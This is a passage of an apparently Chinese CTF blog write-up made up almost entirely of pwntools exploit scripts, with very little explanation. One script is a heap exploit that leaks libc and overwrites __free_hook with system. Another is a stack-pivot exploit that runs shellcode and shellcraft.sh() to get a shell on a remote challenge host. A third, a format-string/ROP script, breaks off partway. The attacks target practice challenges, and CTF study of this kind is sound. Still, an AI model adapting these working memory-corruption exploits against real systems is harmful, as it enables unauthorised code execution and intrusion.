punctuation\">(</span><span class=\"token string\">'content?'</span> <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> size <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size'</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'content?'</span> <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'size'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x400</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x410</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span><span class=\"token operator\">+</span><span class=\"token number\">1</span>\n<span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span> <span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x400</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg()</span>\n\nleak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\nbinsh <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span>\n    __free_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span>\n<span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span> payload <span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'sh\\x00'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token number\">6</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span>binsh <span class=\"token punctuation\">,</span> system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   baige.py\n@Time    :   2021/09/25 11:02:23\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"das-hehepwn\"><a class=\"markdownIt-Anchor\" href=\"#das-hehepwn\">#</a> Das-hehepwn</h1>\n<p>我超！栈题！自己找一下 gadget 即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./bypwn'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'26191'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\nleave <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'leave;ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg('*0x4008ad')</span>\n\nstack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">,</span>stack_addr<span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\n    mov rsi , rbp\n    mov rdi , rax\n    mov rdx , r11\n    syscall\n'''</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4007f6</span> <span class=\"token punctuation\">,</span>stack_addr<span class=\"token operator\">-</span><span class=\"token number\">0x78</span>  <span class=\"token punctuation\">,</span> <span class=\"token number\">0x4007b5</span> <span class=\"token punctuation\">,</span> stack_addr <span class=\"token operator\">-</span><span class=\"token number\">0x28</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave<span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string\">'nop'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'PWN~'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\nse<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   bypwn.py\n@Time    :   2021/09/25 12:01:14\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"das-hahapwn\"><a class=\"markdownIt-Anchor\" href=\"#das-hahapwn\">#</a> Das-hahapwn</h1>\n<p>fmt+rop</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./hahapwn'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.23.so'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'29734'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span 